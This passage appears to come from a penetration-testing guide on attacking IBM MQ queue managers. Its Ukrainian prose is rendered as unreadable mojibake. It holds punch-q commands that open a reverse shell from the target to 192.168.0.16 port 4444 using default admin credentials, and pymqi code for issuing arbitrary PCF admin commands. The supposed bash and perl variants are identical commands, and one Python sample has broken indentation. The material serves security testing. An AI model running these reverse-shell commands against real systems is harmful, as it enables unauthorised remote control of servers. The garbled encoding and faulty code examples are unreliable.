–î–ª—è –ø—Ä–æ—Å—Ç–æ–≥–æ –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ —à–µ–ª–ª—É, **punch-q** —Ç–∞–∫–æ–∂ –ø—Ä–æ–ø–æ–Ω—É—î –¥–≤–∞ –∫–æ—Ä–∏—Å–Ω–∏—Ö –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–ª—è –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ —à–µ–ª–ª—É:

* –û–¥–Ω–µ –∑ bash
* –û–¥–Ω–µ –∑ perl

*–ó–≤–∏—á–∞–π–Ω–æ, –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –≤–ª–∞—Å–Ω–µ –∑ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ `execute`.*

–î–ª—è bash:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
–î–ª—è perl:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### Custom PCF

–í–∏ –º–æ–∂–µ—Ç–µ –æ–∑–Ω–∞–π–æ–º–∏—Ç–∏—Å—è –∑ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é IBM MQ —ñ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É **pymqi** –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ PCF, —è–∫–∞ –Ω–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∞ –≤ **punch-q**.

**Example:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
–Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —ñ–º–µ–Ω–∞ –∫–æ–Ω—Å—Ç–∞–Ω—Ç, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors).

> *–ü—Ä–∏–∫–ª–∞–¥ –¥–ª—è [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (–¥–µ—Å—è—Ç–∫–æ–≤–µ = 73). –í—ñ–Ω –ø–æ—Ç—Ä–µ–±—É—î –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `MQCA_CLUSTER_NAME` (–¥–µ—Å—è—Ç–∫–æ–≤–µ = 2029), —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ `*` (–î–æ–∫: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## –¢–µ—Å—Ç–æ–≤–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ

–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫—É IBM MQ —Ç–∞ –µ–∫—Å–ø–ª–æ–π—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ –Ω–∞ –æ—Å–Ω–æ–≤—ñ Docker:

1. –ú–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –Ω–∞ ibm.com —Ç–∞ cloud.ibm.com.
2. –°—Ç–≤–æ—Ä–∏—Ç–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏–∑–æ–≤–∞–Ω–∏–π IBM MQ –∑:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è —É–≤—ñ–º–∫–Ω–µ–Ω–∞, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ `admin`, –∞ –ø–∞—Ä–æ–ª—å `passw0rd` (–∑–º—ñ–Ω–Ω–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ `MQ_ADMIN_PASSWORD`). –¢—É—Ç —ñ–º'—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ —á–µ—Ä–≥ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `MYQUEUEMGR` (–∑–º—ñ–Ω–Ω–∞ `MQ_QMGR_NAME`).

–í–∞–º —Å–ª—ñ–¥ –º–∞—Ç–∏ IBM MQ, —â–æ –ø—Ä–∞—Ü—é—î –∑ –≤—ñ–¥–∫—Ä–∏—Ç–∏–º–∏ –ø–æ—Ä—Ç–∞–º–∏:
```bash
‚ùØ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> –°—Ç–∞—Ä—ñ –≤–µ—Ä—Å—ñ—ó –æ–±—Ä–∞–∑—ñ–≤ IBM MQ docker –¥–æ—Å—Ç—É–ø–Ω—ñ –∑–∞ –∞–¥—Ä–µ—Å–æ—é: https://hub.docker.com/r/ibmcom/mq/.

## References

* [mgeeky's gist - "–ü—Ä–∞–∫—Ç–∏—á–Ω—ñ –Ω–æ—Ç–∞—Ç–∫–∏ –∑ –ø–µ–Ω–µ—Ç—Ä—É–≤–∞–Ω–Ω—è IBM MQ"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è IBM MQ](https://www.ibm.com/docs/en/ibm-mq)
